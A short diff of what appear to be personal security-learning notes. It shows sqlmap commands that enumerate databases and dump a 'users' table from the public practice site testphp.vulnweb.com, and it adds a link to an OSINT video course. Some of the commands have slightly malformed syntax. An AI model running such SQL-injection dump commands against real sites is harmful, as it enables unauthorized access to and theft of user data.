@@ -800,3 +800,9 @@ sqlmap -h
    74  sqlmap -u testphp.vulnweb.com/listproducts.php?cat=1 --dbs
    75  sqlmap -u testphp.vulnweb.com/listproducts.php?cat=1 acuart -tables
    76  sqlmap -u testphp.vulnweb.com/listproducts.php?cat=1 acuart --tables users --dump
+
+-------------------
+1 agus
+
+learn osint in 4 hours
+https://www.youtube.com/watch?v=qwA6MmbeGNo&t=1173s
